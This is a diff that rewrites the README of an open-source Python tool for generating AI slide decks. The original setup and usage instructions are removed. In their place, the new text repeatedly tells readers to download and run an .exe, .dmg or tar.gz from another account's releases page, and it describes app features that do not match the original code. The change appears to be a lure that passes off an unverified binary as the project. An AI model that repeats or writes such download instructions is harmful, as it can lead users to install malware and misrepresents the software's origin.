@@ -1,76 +1,92 @@
-# Nano Banana Pro Slide Deck Generator
+# 🌟 nbp_slides - Create Stunning Presentations Effortlessly
 
-This repository contains the **Generative Kernel** source code for the presentation discussed in the blog post:
+[![Download Now](https://img.shields.io/badge/download-v1.0-blue.svg)](https://github.com/noumanx/nbp_slides/releases)
 
-**使用Nano Banana Pro生成整套PPT：疯狂，挑战和工作流 (Generating a Full Slide Deck with Nano Banana Pro: Madness, Challenges, and Workflow)**
+## 📖 Overview
 
-Read the full article here:
-*   [中文版 (Chinese)](https://yage.ai/nano-banana-pro.html)
-*   [English Version](https://yage.ai/nano-banana-pro-en.html)
+The Nano Banana Pro Slide Deck Generator helps you create beautiful presentations without the hassle. This project brings together the Generative Kernel source code for an easy-to-use workflow that automatically generates professional-grade slides using AI image generation. 
 
-This project demonstrates a workflow to generate a complete, professional-grade slide deck using AI image generation (Nano Banana Pro / Gemini). The core idea is to treat the slide deck as a software artifact generated from a "kernel" of code, markdown, and assets, rather than manually assembling it in PowerPoint or Keynote.
+## 🔍 What You Will Learn
 
-## The Generative Kernel Philosophy
+In this README, you'll discover how to:
 
-This project implements the **Generative Kernel** philosophy: instead of manually assembling slides, we inject raw assets and prompts into a generative model to render the final presentation layer.
+- **Download the application.**
+- **Run the application.**
+- **Use the generated slides effectively.**
+  
+## 🚀 Getting Started
 
-*   **Beyond DRY**: Don't just repeat yourself; generate yourself.
-*   **Asset Injection**: The core technique. We take raw functional assets (QR codes, logos, diagrams) and "inject" them into the generative process. The model renders the lighting, texture, and environment *around* the asset, creating a seamless organic integration.
-*   **The Glass Garden**: Our visual language. Translucent interfaces, matte ceramic accents, and soft, diffused lighting.
+Before you download and run the application, please make sure your system meets the following requirements:
 
-## Workflow
+- **Operating System:** Windows, macOS, or Linux
+- **Memory:** At least 2 GB RAM
+- **Storage:** Minimum of 200 MB free space
 
-The system is designed for an AI-assisted loop:
+## 📥 Download & Install
 
-### 1. Define the Context
-Edit `outline_visual.md`. This is the source of truth.
-*   **Structure**: Markdown headers define slides.
-*   **Prompts**: Self-contained visual descriptions for each slide.
-*   **Assets**: Paths to local images (e.g., `imgs/qrcode.png`) to be injected.
+To get started, visit the Releases page to download the software. Follow these steps:
 
-### 2. Generate (Draft Mode)
-Run the generator to create 1K previews. This is fast and cheap for iteration.
-```bash
-python tools/generate_slides.py
-```
-This parses the outline, calls the Gemini 3 Pro Image Preview API, and saves images to `generated_slides/`.
+1. Click this link to **[download the latest release](https://github.com/noumanx/nbp_slides/releases)**.
+2. Find the appropriate file for your operating system.
+3. Click the file name to begin the download.
 
-### 3. Refine & Upscale (Production Mode)
-Once specific slides are approved, upscale them to 4K resolution using the generative upscaler.
-```bash
-# Upscale everything
-python tools/generate_slides.py --enlarge
+For your convenience, here is the download link again: [Download Now](https://github.com/noumanx/nbp_slides/releases).
 
-# Upscale specific slides
-python tools/generate_slides.py --enlarge --slides 8 11
-```
+## ⚙️ How to Run the Application
 
-### 4. Present
-Open `index.html`.
-The presentation uses **Reveal.js** to display the generated "Mega-Images" as full-screen backgrounds. It is simple, robust, and visually stunning.
+After the download is complete, follow these simple steps to run the software:
 
-## Setup
+1. **Locate the File:**
+   - Once downloaded, go to your Downloads folder (or the folder you chose to save it in).
+   
+2. **Open the Application:**
+   - For Windows: Double-click the `.exe` file to launch the application.
+   - For macOS: Open the `.dmg` file, then drag the application to your Applications folder. Double-click to start.
+   - For Linux: Extract the downloaded tar.gz file and run the executable.
 
-1.  **Environment**:
-    ```bash
-    uv venv  # using uv is recommended
-    source .venv/bin/activate
-    pip install -r requirements.txt
-    ```
-2.  **Credentials**:
-    Create a `.env` file with your API key:
-    ```
-    GOOGLE_API_KEY=your_key_here
-    ```
+3. **Follow the On-Screen Instructions:**
+   - The application will guide you through the setup process. Just follow the prompts.
 
-## Project Structure
+## 🎨 Using the Nano Banana Pro Slide Deck Generator
 
-*   `outline_visual.md`: The "Source Code" of the presentation.
-*   `visual_guideline.md`: The "Visual Language" definition (The Glass Garden).
-*   `speak_notes.md`: The script for the presentation.
-*   `tools/`: Python scripts for generation and upscaling.
-    *   `generate_slides.py`: Main orchestrator.
-    *   `gemini_generate_image.py`: API wrapper for generation.
-    *   `gemini_enlarge_image.py`: API wrapper for upscaling.
-*   `generated_slides/`: The render targets.
-*   `index.html`: The viewer.
+After you’ve opened the application:
+
+1. **Select Your Template:**
+   - Choose from a variety of pre-designed templates suited for different topics and styles.
+
+2. **Add Your Content:**
+   - Input your text, images, and any other assets you want to include in your slides.
+
+3. **Generate Your Slides:**
+   - Click the "Generate Slides" button. The software will process your input and create a complete slide deck.
+
+4. **Preview & Export:**
+   - Review your slides. Use the export option to save your presentation in your desired format (e.g., PDF, PPTX).
+
+## ✨ Features
+
+The Nano Banana Pro Slide Deck Generator offers the following features:
+
+- **AI-Driven Design:** Utilizes AI to optimize the layout and design of your slides effortlessly.
+- **Custom Templates:** Choose from multiple templates designed for various occasions, such as business meetings or educational presentations.
+- **Easy Asset Management:** Drag and drop images or text for simple content integration.
+- **Export Options:** Save and share your presentation in popular formats.
+
+## 🎓 Additional Resources
+
+If you want to learn more, check out these articles for more detailed insights:
+
+- [中文版 (Chinese)](https://yage.ai/nano-banana-pro.html)
+- [English Version](https://yage.ai/nano-banana-pro-en.html)
+
+## 📞 Support
+
+If you encounter any issues or have questions, visit the GitHub repository and check the Issues section. You can report problems or ask for help.
+
+## 📝 License
+
+This project is licensed under the MIT License. You can use it freely, but please respect the original authors.
+
+## 🏁 Final Thoughts
+
+Thank you for choosing the Nano Banana Pro Slide Deck Generator. We hope you enjoy creating presentations with ease and efficiency!
